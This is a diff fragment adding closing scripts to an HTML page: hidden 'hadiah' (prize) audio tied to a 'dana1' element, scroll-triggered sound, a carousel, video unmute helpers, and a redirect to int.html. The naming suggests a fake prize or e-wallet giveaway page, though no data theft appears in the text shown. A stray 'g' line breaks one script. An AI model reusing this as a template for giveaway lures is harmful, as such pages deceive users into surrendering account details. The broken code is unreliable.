+ <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhRSK67Qt_K9V2NypHGwyMZVpw-rffXN3_27_Eh-w5G_Y7ynHoq-kjgHXjDhPCKS8jZ1FVmuGjE7d5VgeDsUo55T52dA8PmMp39u1nr0xI-p_9GAc5rQbriTYPo9OeteEjvJFitBVM6piLsaA9ZxJnwZlK3l2b75Azac2yDM9ycXFfsf1Yy3PeqOKUI3Zk/s306/Record_2024-06-03-05-43-41-ezgif.com-resize.gif" style="width: 50px; position: fixed; top: 0; right: 8; margin: 0px auto; z-index: ;" >      
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhW-3Xsq1r5wVb5r0tfUzFr9KzB9hy1r0-W4GkBcDTnYujbw_NNeMWw-l8MZCk4RYNJpcSZRf5tv-TPa5HnYvv_x-EzticmLwx1vO4bIlqTJAiyk4-i96QjCFlPHT8BMy9nF15ISyjxVVOz2DAv8osBBR9onrE3lJf96Vw5erolKuss9ZrTFAFhoJAU4Js/s1080/1704436332522.png" style="width: 100%; position: fixed; bottom: -5; left: 0; right: 0; margin: 0px auto; z-index: -1;"> 
+<audio hidden controls id="dana1">
+  <source src="hadiah.ogg" type="audio/ogg">
+  <source src="hadiah.mp3" type="audio/mpeg">
+  Your browser does not support the audio element.
+</audio>
+<script>
+    const video = document.getElementById("video");
+video.addEventListener("play", handleFirstPlay, false);
+
+let hasPlayed = false;
+function handleFirstPlay(event) {
+  if (!hasPlayed) {
+    hasPlayed = true;
+
+    // Remove listener so this only gets called once.
+    const vid = event.target;
+    vid.removeEventListener("play", handleFirstPlay);
+
+    // Start whatever you need to do after first playback has started
+  }
+}
+
+
+
+
+var played = false;
+  g
+  $(window).scroll(function() {
+    var elemTop = $('#counter').offset().top, 
+            elemHeight = $('#counter').outerHeight(), 
+            windowHeight = $(window).height(),
+            windowScroll = $(this).scrollTop();
+    var countdownSound = new Audio(src="hadiah.mp3");
+
+    if( windowScroll > (elemTop + elemHeight - windowHeight) ) {
+        countdownSound.play();
+    }
+});
+</script>
+<!-- partial -->
+  <script>
+var owl = $('.owl-carousel');
+owl.owlCarousel({
+    items:2, 
+  // items change number for slider display on desktop
+  
+    loop:true,
+    margin:10,
+    autoplay:true,
+    autoplayHoverPause:true
+});      
+      
+  </script>
+
+<script>
+    /* Toggle Button to Unmute the Video */
+
+function toggleMute() {
+    var video = document.getElementById('video');
+    if (video.muted) {
+        video.muted = false;
+    } else {
+        video.muted = true;
+    }
+}
+
+/* Delay Function to Add SetTimeOut After Defined Interval */
+
+function delay(time) {
+    return new Promise((resolve) => setTimeout(resolve, time));
+}
+
+/* Show Video Function to Add Display Property to Show the Video on Click of Button which will fulfilled User Interaction Needs to Browser to Run the Video with Unmute State */
+
+function showVideo() {
+    var element = document.getElementById('video');
+    var button = document.getElementById('button');
+    element.style.display = 'block';
+    button.style.display = 'none';
+    delay(100).then(() => toggleMute());
+}
+</script>
+   <script>
+ function play(){
+     audio = document.getElementById("dana1");
+    audio.play();
+    audio.loop = false
+    setTimeout(() => {
+   $("#kelentet").hide();
+    }, 1000);
+    
+ }
+ 
+ 
+ 
+
+
+
+
+
+
+
+
+</script>
+<script>
+ function letsgo(){
+ $("#process1").show();    
+ window.location.href="int.html";
+ }   
+</script>
+
+</body>
 </html>
